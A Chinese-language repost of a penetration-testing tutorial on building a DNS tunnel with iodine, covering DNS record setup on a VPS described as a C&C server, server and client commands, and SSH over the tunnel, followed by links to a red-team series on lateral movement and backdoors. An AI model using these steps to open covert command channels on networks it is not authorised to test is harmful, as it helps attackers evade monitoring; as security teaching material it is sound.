> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Pd6BEs1Tok0A9EWIGHk9dA)

本公众号发布的文章均转载自互联网或经作者投稿授权的原创，文末已注明出处，其内容和图片版权归原网站或作者本人所有，并不代表安世加的观点，若有无意侵权或转载不当之处请联系我们处理，谢谢合作！

欢迎各位添加微信号：**asj-jacky**

加入**安世加** 交流群 和大佬们一起交流安全技术

  

应用层隧道技术之使用 DNS 搭建隧道 (iodine)

  

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWMZKGERHv4lhAv6ibdI7tRRocX3uA4PYUnEk08DM9QyXNP2vLyYcFLfg/640?wx_fmt=png)

  

目录

    iodine

    使用 iodin 搭建隧道

        （1）：部署域名解析

        （2）：安装并启动服务端

        （3）：安装并启动客户端

        （4）：使用 DNS 隧道

  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWMZKGERHv4lhAv6ibdI7tRRocX3uA4PYUnEk08DM9QyXNP2vLyYcFLfg/640?wx_fmt=png)

  

  

  

  

➩iodine

iodine 是基于 C 语言开发的，分为服务端和客户端。iodine 支持转发模式和中继模式。其原理是：通过 TAP 虚拟网卡，在服务端建立一个局域网；在客户端，通过 TAP 建立一个虚拟网卡；两者通过 DNS 隧道连接，处于同一个局域网 (可以通过 ping 命令通信)。在客户端和服务器之间建立连接后，客户机上会多出一块名为 dns0 的虚拟网卡。

与同类工具相比，iodine 具有如下特点：

*   不会对下行数据进行编码
    
*   支持多平台 (Linux、Windows、MacOS)
    
*   支持 16 个并发连接
    
*   支持强密码机制
    
*   支持同网段隧道 IP 地质 (不同于服务器一客户端网段)
    
*   支持多种 DNS 记录类型
    
*   提供了丰富的隧道质量检测措施
    

  

  

  

➪**使用 iodin 搭建隧道**

### 1）：部署域名解析

首先，用一台公网的 Linux 系统的 VPS 作为 C&C 服务器，并准备好一个可以配置的域名 (这里我们假设是 hack.com)。然后，去配置域名的记录。首先创建记录 A，将自己的域名 www.hack.com 解析到 VPS 服务器地址。然后，创建 NS 记录，将 test.hack.com 指向 www.hack.com 。

*   第一条 A 类解析是在告诉域名系统，www.hack.com 的 IP 地址是 xx.xx.xx.xx 。
    
*   第二条 NS 解析是在告诉域名系统，想要知道 test.hack.com 的 IP 地址，就去问 www.hack.com 。
    

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWLybVTXEiclWkLAwFCV0WCsuvopgxCrjIuQedx9Fz450D9Q50Tcj9r6Q/640?wx_fmt=png)

为什么要设置 NS 类型的记录呢？因为 NS 类型的记录不是用于设置某个域名的 DNS 服务器的，而是用于设置某个子域名的 DNS 服务器的。

**如何验证域名解析设置是否成功？**  
在随便一台电脑上 ping 域名 www.hack.com ，若能 ping 通，且显示的 IP 地址是我们配置的 VPS 的地址，说明第一条 A 类解析设置成功并已生效。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWavC7REDe7CoEHEdSZQ352dG9qcPwMeibGvtwUPp1vrZmthQQ9hde7Aw/640?wx_fmt=png)

然后在我们的 VPS 上执行以下命令监听 UDP53 端口

```
tcpdump -n -i eth0 udp dst port 53
```

在任意一台机器上执行  nslookup test.hack.com 命令，如果在我们的 VPS 监听的端口有查询信息，说明第二条记录设置成功

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWWOt0ecp4eyt0Idy5Kya8nu8RpeHVnkMnUdeeowYTYPkXWG0KwlomRg/640?wx_fmt=png)

  

  

  

### （2）：安装并启动服务端

Kali 中默认安装了 iodine，但是我们这里用的服务端是 Centos7 系统，可以执行命令：yum -y install iodine 安装。如果是 Windows 系统，可以安装编译好的对应版本的 iodine。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWupekmiaIBuv6L1VNNJCwREnEatRTVPYB4seToj0KLeEj1ParGd53R3A/640?wx_fmt=png)

执行以下命令启动服务端

```
iodined -f -c -P root@123456 192.168.100.1 test.hack.com -DD
    -f：在前台运行
    -c：禁止检查所有传入请求的客户端IP地址
    -P：指定密码
    -D：指定调试级别。-DD指第二级，D的数量随等级增加
    这里的192.168.10.1是自定义的局域网虚拟IP地址
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjW2095C1jzFpBuAAOBPc1HJIc1Mb8qib0ibhUJx7ibLS1ibq7T14C9ibNR3cQ/640?wx_fmt=png)

启动完后，可以通过 iodine 检查页面：https://code.kryo.se/iodine/check-it/  检查配置是否正确。如下，表示设置成功

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWulU0phedCdQ0n4WichRJwHXs8iahQpHZrdp7zreSlN8F4EXqrIPyYiayw/640?wx_fmt=png)

服务端启动成功后，VPS 上多了一块 dns0 的网卡，ip 为我们设置的 192.168.100.1

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWB27f5BRBcTUYLeTkUSfmruyChLNiaUdKBrfQ3A6CVPe7xOToTSjHefw/640?wx_fmt=png)

  

  

  

### （3）：安装并启动客户端

**Windows 系统**

如果是 Windows 系统，直接执行下面命令启动客户端，但是启动的过程中，会遇到杀毒软件的报毒，并且需要管理员权限执行命令才可以启动

```
iodine.exe -f -P root@123456 test.hack.com
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWKHaq1Z00fX1s8pbreEDvsTmicDoUQK1icb1YPjmicp8Hibfzgsn7nKVAAw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWRonok9GcoqicvZoXzsZIMrrQkV6K1kfib8XHLFvC48wK7fEnOFXzgNlw/640?wx_fmt=png)

那我们现在就以管理员权限运行该命令，如图，DNS 隧道建立成功

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWicxY1omYVOHUJVWbWC46d8e0VcdfAyrQny4NvyWa7nZVrObkOj3ibyUA/640?wx_fmt=png)

查看客户端网卡，多了一张以太网 2，IP 为 192.168.100.2。此时，我们的 VPS 和客户端处在同一个逻辑的局域网内。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWpZibfym4YVjZic267rTMKXM73V2Y5OBCnN6bssAiay5aSKWTEt8u94KVw/640?wx_fmt=png)

但是此时 ping 服务端的 192.168.100.1 地址却 ping 不通，不知为何，客户端如果是 Linux 则不会有此情况。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWtsjJ4OZ0V6Z71RxddJUhlia51vPXiaiafibUCiaUbtM22sswnNagmLrEjxg/640?wx_fmt=png)

**Linux 系统**

如果是 Linux 系统，先安装 iodine。上传 iodlie 客户端到目标主机，解压，进入目录安装

```
cd iodine-0.7.0/
make && make install
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWB54f9beQu6NOPIUKM7qibkajqjrm5s9vkargQSdOKVp1ueNBhXFpiaXg/640?wx_fmt=png)

然后执行下面命令连接服务端 (需要 root 权限)，如图连接成功。

```
iodine -f -P root@123456 test.hack.com
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWY6QOrgncgz6fib1Gibw4EgOZN3FVMfuYxd1em9GQxaK9pPd4uDDfxAsw/640?wx_fmt=png)

连接成功后，客户端上新建了一个 dns0 的网卡，IP 地址为 192.168.100.2

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWmNuctnQh797caicUmOx2Ea9GkOpia79uiaZD1j4Qp3dOeA8LhescKicKNQ/640?wx_fmt=png)

然后 ping 服务端地址 192.168.100.1，能互通！

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWqumxG2uicDbz0lCGIDS7rWFnicg6rUSO6SRP3DpicQjQYhpR3LtQmUw4w/640?wx_fmt=png)

  

  

  

### （4）：使用 DNS 隧道

客户端和服务端连接成功后，由于客户端和服务端处在一个逻辑的局域网中，所以可以直接通。

**服务端 SSH 连接客户端**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWSV2lyVIBzxgn7gkaNZpHLfo4eRM0NGiaP8Xl5Yb15Megbxic6r55bdbA/640?wx_fmt=png)

**客户端 SSH 连接服务端**

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2cHpwXmcK3yMuYDVA64RcjWbMsoia4mRLW213GgX8eKEKjajueInZEQVbnia3yeF0EHqlQru0cTlKwA/640?wx_fmt=png)

其他服务也是一样，可以直接指定虚拟局域网的 IP 和端口就可连接。

  

  

相关链接：

[内网渗透（二十）| 内网转发及隐蔽隧道：使用 DNS 进行命令控制 (DNS-Shell)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247497712&idx=2&sn=3334ef9b66bf49ae83d51eb0829a78c2&chksm=fc7bf32dcb0c7a3b98c8f3a3eab315bf0afb9d463662d07520367a8cc82d517e5b2c393e3037&scene=21#wechat_redirect)  

[内网渗透（十九）| 内网转发及隐蔽隧道：使用 ICMP 进行命令控制 (Icmpsh)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247497168&idx=1&sn=19136898b3a7f46873a836d31a58fa21&chksm=fc7bf10dcb0c781b4e865ca53cb9a83fd32bf7889477211118da4ea70481a682d5e459c5ccc0&scene=21#wechat_redirect)  

[内网渗透（十八）| 工具的使用：MSF 中获取用户密码](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247495828&idx=3&sn=64b978670f81deee0a5e07137799be05&chksm=fc7bf449cb0c7d5fdacd74bc9d760134228b94cf04003a2237e92755b1477f29a267f4e52046&scene=21#wechat_redirect)  

[内网渗透（十七） | 内网转发及隐蔽隧道：使用 SSH 做端口转发以及反向隧道](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247494972&idx=1&sn=0e309e74481b64577b87c3802d75858c&chksm=fc7be9e1cb0c60f71eb23300f692cea9936327254e285851fb7f6ee9fcd57debef711d69766b&scene=21#wechat_redirect)  

[内网渗透（十六） | 域分析工具 BloodHound 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247494062&idx=1&sn=0c486f53daca08ee61abc51926db2b96&chksm=fc7bed73cb0c646557767e2e21d3c0113df80f831263dea4ce45bd6969da44f27ee700518427&scene=21#wechat_redirect)  

[内网渗透 | 红蓝对抗：Windows 利用 WinRM 实现端口复用打造隐蔽后门](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247493916&idx=2&sn=eacc42e5f8f68fc65dae1c8a1201f014&chksm=fc7bedc1cb0c64d7115c0c3bf84410e29102a25627891c9eb85cba2026b7bc3622a9ebb5e2b2&scene=21#wechat_redirect)  

[内网渗透（十五） | psexec 工具使用浅析 (admin$)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247493004&idx=1&sn=e908ac6ef03c0b5ae0cc5a2cabba7ebb&chksm=fc7be151cb0c684789bbc5f6a54e5906a3fed929eeffdba7667839491826fbb029bba295ef82&scene=21#wechat_redirect)  

[内网渗透（十四） | 工具的使用 | Impacket 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247492731&idx=1&sn=570c1d9e12ef39709e289b5cc9e2447f&chksm=fc7be0a6cb0c69b0d94c41408b862214beaa631b04ba32f2307819a8b3ac445726849cb24e7f&scene=21#wechat_redirect)

[内网渗透（十三） | WinRM 远程管理工具的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247492427&idx=1&sn=af3a862d78184e93b6e9377f12bce354&chksm=fc7be796cb0c6e80a057dff2a7d67e3483c33e8da2d3a7acb84d04fdd997f28cb89f1fd617fd&scene=21#wechat_redirect)  

[内网渗透（十二） | 利用委派打造隐蔽后门 (权限维持)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247491363&idx=1&sn=e5d6670b0f76299d92110d7b679ad70b&chksm=fc781bfecb0f92e8aacaa6f4f7788ed48577e25f943d92073b1b26e68bfbc8f505b2dd2fa4d8&scene=21#wechat_redirect)  

[内网渗透（十一） | 哈希传递攻击 (Pass-the-Hash,PtH)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490908&idx=1&sn=97594fbbef40346d07b5a6e5185ce77e&chksm=fc781981cb0f9097d18f4b32ff39f59b3512cedd35f0810ad5f61b661e631153f8c4e157d875&scene=21#wechat_redirect)  

[技术干货 | 工具：Social engineering tookit 钓鱼网站](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490513&idx=2&sn=10afb29a20f37df05ebb12ea4d540e1f&chksm=fc781f0ccb0f961a85e646dd54e977dbcaeb5569be6701db4c29b9e204d964bab3ded6bf1999&scene=21#wechat_redirect)

[技术干货 | 工具的使用：CobaltStrike 上线 Linux 主机 (CrossC2)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490608&idx=1&sn=f2b2ea93b109447aa8cc2c872aa87c52&chksm=fc7818edcb0f91fbf85fa53f71e9967fc29fc93f6a783eed154707ca2dec24ca7f419fde5705&scene=21#wechat_redirect)

[内网渗透（十） | 票据传递攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490376&idx=2&sn=c070dd4c761b49d3fabd573cc9c96b5a&chksm=fc781f95cb0f9683b0f6c64f5db5823973c1b10e87b1452192bbed6c1159eccf6e8f2fd0290b&scene=21#wechat_redirect)  

[内网渗透（九） | Windows 域的管理](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490197&idx=1&sn=4682065ddcab00b584918bc267e33f53&chksm=fc781e48cb0f975eddc44d77698fbb466d0eac7d745a6e5bbaf131560b3d4f9e22c1a359d241&scene=21#wechat_redirect)  

[内网渗透（八） | 内网转发工具的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247490042&idx=1&sn=136d4057044a7d6f6cb5b57d20f7954a&chksm=fc781d27cb0f9431ec590662ab4e6bcd31b303e7caa20a2b116fd9a9b97e9e3be0bc34408490&scene=21#wechat_redirect)  

[内网渗透 | 域内用户枚举和密码喷洒攻击 (Password Spraying)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489985&idx=1&sn=0b7bce093e501b9817f263c24e0ed5b8&chksm=fc781d1ccb0f940aad0c9b2b06b68c7a58b0b4c513fe45f7da6e6438cac76d4778e61122faf8&scene=21#wechat_redirect)  

[内网渗透（七） | 内网转发及隐蔽隧道：网络层隧道技术之 ICMP 隧道 (pingTunnel/IcmpTunnel)](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489736&idx=2&sn=0cb551ee520860878c2c33108033c00c&chksm=fc781c15cb0f9503f672aa0bd18cb13fef4c60124ba5978ab947c34272b2d8a28c584a99219d&scene=21#wechat_redirect)  

[内网渗透（六） | 工作组和域的区别](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489205&idx=1&sn=24f9a2e0e6b92a167f3082bb6e09c734&chksm=fc781268cb0f9b7e3c11d19a9fb41567124055eb0e8dd526cbbaf1e9393ff707f9fa9d10c32b&scene=21#wechat_redirect)  

[内网渗透（五） | AS-REP Roasting 攻击](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489128&idx=1&sn=dac676323e81307e18dd7f6c8998bde7&chksm=fc7812b5cb0f9ba3a63c447468b7e1bdf3250ed0a6217b07a22819c816a8da1fdf16c164fce2&scene=21#wechat_redirect)

[内网渗透 | 内网穿透工具 FRP 的使用](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247489057&idx=3&sn=f81ef113f1f136c2289c8bca24c5deb1&chksm=fc7812fccb0f9beaa65e5e9cf40cf9797d207627ae30cb8c7d42d8c12a2cb0765700860dab84&scene=21#wechat_redirect)  

[内网渗透（四） | 域渗透之 Kerberoast 攻击_Python](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488972&idx=1&sn=87a6d987de72a03a2710f162170cd3a0&chksm=fc781111cb0f98070f74377f8348c529699a5eea8497fd40d254cf37a1f54f96632da6a96d83&scene=21#wechat_redirect)  

[内网渗透（三） | 域渗透之 SPN 服务主体名称](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488936&idx=1&sn=82c127c8ad6d3e36f1a977e5ba122228&chksm=fc781175cb0f986392b4c78112dcd01bf5c71e7d6bdc292f0d8a556cc27e6bd8ebc54278165d&scene=21#wechat_redirect)  

[内网渗透（二） | MSF 和 CobaltStrike 联动](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488905&idx=2&sn=6e15c9c5dd126a607e7a90100b6148d6&chksm=fc781154cb0f98421e25a36ddbb222f3378edcda5d23f329a69a253a9240f1de502a00ee983b&scene=21#wechat_redirect)  

[内网渗透 | 域内认证之 Kerberos 协议详解](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488900&idx=3&sn=dc2689efec7757f7b432e1fb38b599d4&chksm=fc781159cb0f984f1a44668d9e77d373e4b3bfa25e5fcb1512251e699d17d2b0da55348a2210&scene=21#wechat_redirect)  

[内网渗透（一） | 搭建域环境](http://mp.weixin.qq.com/s?__biz=MzU2MTQwMzMxNA==&mid=2247488866&idx=2&sn=89f9ca5dec033f01e07d85352eec7387&chksm=fc7811bfcb0f98a9c2e5a73444678020b173364c402f770076580556a053f7a63af51acf3adc&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_jpg/UZ1NGUYLEFiasFnl5ibtawibibY69B7x2BLrkhfCTluxJ5V0mmv7bXI760XLZHfQqo98ocjBhXjTtuM7zw1iamtPlrw/640?wx_fmt=jpeg)](https://mp.weixin.qq.com/s?__biz=MzA3NzM2MjAzMg==&mid=2657228904&idx=1&sn=aa0d7a52864f19cbd6245a46ce162a1f&scene=21#wechat_redirect)